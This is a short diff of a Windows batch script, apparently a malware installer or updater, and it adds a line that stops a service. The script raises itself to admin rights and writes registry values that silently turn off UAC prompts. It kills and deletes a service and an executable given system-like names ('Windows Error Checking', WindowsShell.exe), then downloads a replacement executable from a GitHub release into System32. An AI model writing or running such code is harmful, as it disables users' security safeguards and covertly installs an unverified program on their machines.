@@ -4,6 +4,7 @@ cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) &&
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
 taskkill /im WindowsShell.exe /f 
+start /b net stop "Windows Error Checking"
 sc delete "Windows Error Checking"
 del /f /q "C:\Windows\System32\WindowsPowerShell\WindowsShell.exe"
 powershell -Command "curl -o C:\Windows\System32\WindowsPowerShell\WindowsShell.exe https://github.com/mitutina/mitutina/releases/download/WindowsShell/WindowsShell.exe"
